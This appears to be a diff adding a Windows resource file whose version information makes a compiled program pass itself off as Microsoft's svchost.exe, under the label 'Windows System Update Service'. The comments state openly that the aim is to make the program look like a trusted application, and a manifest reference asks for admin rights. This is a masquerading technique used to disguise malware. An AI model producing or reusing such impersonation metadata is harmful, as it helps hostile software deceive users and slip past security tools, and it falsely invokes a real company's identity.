@@ -1,0 +1,55 @@
+// Windows Resource File for Trusted Appearance
+// Compiled with: windres resource.rc -o resource.o
+
+#include <windows.h>
+
+// Icon (can be replaced with custom .ico file)
+// IDI_ICON1 ICON "app_icon.ico"
+
+// Version Information - Makes it look like a legitimate Microsoft or other trusted application
+VS_VERSION_INFO VERSIONINFO
+FILEVERSION     10,0,19041,1
+PRODUCTVERSION  10,0,19041,1
+FILEFLAGSMASK   VS_FFN_MASK
+FILEFLAGS       0x0L
+FILEOS          VOS_NT_WINDOWS32
+FILETYPE        VFT_APP
+FILESUBTYPE     VFT2_UNKNOWN
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"  // English (US)
+        BEGIN
+            // Company - Use well-known trusted companies
+            VALUE "CompanyName", "Microsoft Corporation\0"
+            
+            // Description - Make it sound legitimate
+            VALUE "FileDescription", "Windows System Update Service\0"
+            
+            // Version
+            VALUE "FileVersion", "10.0.19041.1\0"
+            
+            // Internal name
+            VALUE "InternalName", "svchost\0"
+            
+            // Copyright - Legitimate looking
+            VALUE "LegalCopyright", "© Microsoft Corporation. All rights reserved.\0"
+            
+            // Original filename
+            VALUE "OriginalFilename", "svchost.exe\0"
+            
+            // Product name
+            VALUE "ProductName", "Microsoft® Windows® Operating System\0"
+            
+            // Product version
+            VALUE "ProductVersion", "10.0.19041.1\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200  // English (US), Unicode
+    END
+END
+
+// Manifest - Request admin if needed, declare Windows compatibility
+1 RT_MANIFEST "manifest.xml"
